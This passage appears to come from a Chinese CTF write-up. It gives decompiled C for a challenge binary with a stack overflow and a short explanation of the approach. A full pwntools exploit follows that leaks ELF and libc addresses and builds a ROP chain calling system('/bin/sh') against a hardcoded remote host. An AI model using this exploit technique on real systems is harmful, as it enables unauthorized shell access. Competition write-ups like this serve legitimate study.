  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\x1B[1;31m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\x1B[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Sorry, member registration is closed."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\x1B[1;31m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\x1B[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"BUT, we're seeking a creative person for naming a song!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span>byte_3080<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">sub_1E8B</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> ptr<span class="token punctuation">[</span><span class="token number">208</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-160h] BYREF</span>
  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">60</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+D0h] [rbp-90h] BYREF</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+10Ch] [rbp-54h] BYREF</span>
  <span class="token keyword">char</span> v4<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+110h] [rbp-50h] BYREF</span>
  __int64 v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+138h] [rbp-28h]</span>
  __int64 v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+140h] [rbp-20h]</span>
  __int64 v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+148h] [rbp-18h]</span>
  __int64 v8<span class="token punctuation">;</span> <span class="token comment">// [rsp+150h] [rbp-10h]</span>
  __int64 v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+158h] [rbp-8h]</span>

  <span class="token function">puts</span><span class="token punctuation">(</span>byte_3080<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">print_data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">strcpy</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> <span class="token string">"Thank you for filling the questionnaire"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v5 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  v6 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  v7 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  v8 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  v9 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\x1B[1;32m[+]\x1B[0m Anyway, we want to identify your persona."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[?] Kindly fill the questionnaire below [?]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Name: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Age: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Life background: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fread</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v3<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>byte_3080<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>byte_3080<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"======= YOUR DATA ======="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Name: %s\n"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Age: %d\n"</span><span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Life Background: %s\n"</span><span class="token punctuation">,</span> ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>byte_3080<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\x1B[1;33m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] Data saved!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\x1B[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>byte_3080<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\x1B[1;32m>>\x1B[0m %s\n"</span><span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>程序的逻辑很简单，在ext函数中存在一个溢出，不过程序有pie，细看 ext会发现在输出的时候%s可以用来泄露栈上的数据，所以思路是泄露elf基地址后，利用残留的rdi寄存器 puts泄露libc地址，然后再打system binsh</p>
<p>exp</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># from LibcSearcher import *</span>
<span class="token keyword">import</span> itertools
<span class="token keyword">import</span> ctypes

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

is_debug <span class="token operator">=</span> <span class="token number">1</span>
IP <span class="token operator">=</span> <span class="token string">"47.100.139.115"</span>
PORT <span class="token operator">=</span> <span class="token number">30708</span>

elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./ictf-band'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">not</span> is_debug <span class="token keyword">else</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>

g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
r_leak_libc_64 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r_leak_libc_32 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">create_ucontext</span><span class="token punctuation">(</span>
    src<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span>
    rsp<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rbx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rbp<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r12<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r13<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r14<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r15<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rsi<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rdi<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rcx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r8<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r9<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rdx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rip<span class="token operator">=</span><span class="token number">0xDEADBEEF</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytearray</span><span class="token punctuation">:</span>
    b <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0xE0</span><span class="token punctuation">:</span><span class="token number">0xE8</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>src<span class="token punctuation">)</span>  <span class="token comment"># fldenv ptr</span>
    b<span class="token punctuation">[</span><span class="token number">0x1C0</span><span class="token punctuation">:</span><span class="token number">0x1C8</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x1F80</span><span class="token punctuation">)</span>  <span class="token comment"># ldmxcsr</span>

    b<span class="token punctuation">[</span><span class="token number">0xA0</span><span class="token punctuation">:</span><span class="token number">0xA8</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rsp<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x80</span><span class="token punctuation">:</span><span class="token number">0x88</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rbx<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x78</span><span class="token punctuation">:</span><span class="token number">0x80</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rbp<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x48</span><span class="token punctuation">:</span><span class="token number">0x50</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r12<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x50</span><span class="token punctuation">:</span><span class="token number">0x58</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r13<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x58</span><span class="token punctuation">:</span><span class="token number">0x60</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r14<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x60</span><span class="token punctuation">:</span><span class="token number">0x68</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r15<span class="token punctuation">)</span>

    b<span class="token punctuation">[</span><span class="token number">0xA8</span><span class="token punctuation">:</span><span class="token number">0xB0</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rip<span class="token punctuation">)</span>  <span class="token comment"># ret ptr</span>
    b<span class="token punctuation">[</span><span class="token number">0x70</span><span class="token punctuation">:</span><span class="token number">0x78</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x68</span><span class="token punctuation">:</span><span class="token number">0x70</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x98</span><span class="token punctuation">:</span><span class="token number">0xA0</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rcx<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x28</span><span class="token punctuation">:</span><span class="token number">0x30</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r8<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x30</span><span class="token punctuation">:</span><span class="token number">0x38</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r9<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x88</span><span class="token punctuation">:</span><span class="token number">0x90</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rdx<span class="token punctuation">)</span>

    <span class="token keyword">return</span> b


<span class="token keyword">def</span> <span class="token function">setcontext32</span><span class="token punctuation">(</span>libc<span class="token punctuation">:</span> ELF<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    got <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> libc<span class="token punctuation">.</span>dynamic_value_by_tag<span class="token punctuation">(</span><span class="token string">"DT_PLTGOT"</span><span class="token punctuation">)</span>
    plt_trampoline <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> libc<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">".plt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
    <span class="token keyword">return</span> got<span class="token punctuation">,</span> flat<span class="token punctuation">(</span>
        p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        p64<span class="token punctuation">(</span>got <span class="token operator">+</span> <span class="token number">0x218</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"setcontext"</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        p64<span class="token punctuation">(</span>plt_trampoline<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0x40</span><span class="token punctuation">,</span>
        create_ucontext<span class="token punctuation">(</span>got <span class="token operator">+</span> <span class="token number">0x218</span><span class="token punctuation">,</span> rsp<span class="token operator">=</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"environ"</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">)</span>
<span class="token comment"># e.g. dest, payload = setcontext32.setcontext32(</span>
<span class="token comment">#         libc, rip=libc.sym["system"], rdi=libc.search(b"/bin/sh").__next__()</span>
<span class="token comment">#     )</span>

p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">ext</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> length<span class="token punctuation">,</span> _payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b':'</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>data<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b':'</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>length<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b':'</span><span class="token punctuation">,</span> _payload<span class="token punctuation">)</span>

payload <span class="token operator">=</span> cyclic<span class="token punctuation">(</span><span class="token number">0x167</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\xeb'</span>
ext<span class="token punctuation">(</span><span class="token string">b'b'</span> <span class="token operator">*</span> <span class="token number">0x8</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>

ru<span class="token punctuation">(</span><span class="token string">b'adoaa'</span><span class="token punctuation">)</span>
elf_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x22eb</span>
success<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"elf_base -></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>elf_base<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
elf<span class="token punctuation">.</span>address <span class="token operator">=</span> elf_base

puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
get_persona <span class="token operator">=</span> elf<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token number">0x1e8b</span>

payload <span class="token operator">=</span> cyclic<span class="token punctuation">(</span><span class="token number">0x167</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf_base <span class="token operator">+</span> <span class="token number">0x0000000000022E6</span><span class="token punctuation">)</span>
ext<span class="token punctuation">(</span><span class="token string">b'b'</span> <span class="token operator">*</span> <span class="token number">0x8</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>

ru<span class="token punctuation">(</span><span class="token string">b'ved!'</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">"dnaadoaa"</span><span class="token punctuation">)</span>
rl<span class="token punctuation">(</span><span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> unpack<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x62050</span>
success<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'LIBC BASE --> </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>

pop_rdi_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x000000000002a3e5</span>
system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
binsh <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x00000000000baaf9</span>

payload <span class="token operator">=</span> cyclic<span class="token punctuation">(</span><span class="token number">0x167</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
ext<span class="token punctuation">(</span><span class="token string">b'b'</span> <span class="token operator">*</span> <span class="token number">0x8</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>


p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="bopity"><a href="#bopity" class="headerlink" title="bopity"></a>bopity</h2><p>和ropity逻辑一样</p>
<h2 id="hopper"><a href="#hopper" class="headerlink" title="hopper"></a>hopper</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">int</span> __cdecl __noreturn main<span class="token punctuation">(</span><span class="token builtin">int</span> argc<span class="token punctuation">,</span> const char <span class="token operator">**</span>argv<span class="token punctuation">,</span> const char <span class="token operator">**</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  __int64 v3<span class="token punctuation">;</span> <span class="token operator">//</span> rax
  <span class="token builtin">int</span> v4<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>54h<span class="token punctuation">]</span> BYREF
  char v5<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>10h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>50h<span class="token punctuation">]</span> BYREF
  char v6<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>30h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>30h<span class="token punctuation">]</span> BYREF
  unsigned __int64 v7<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>48h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>18h<span class="token punctuation">]</span>

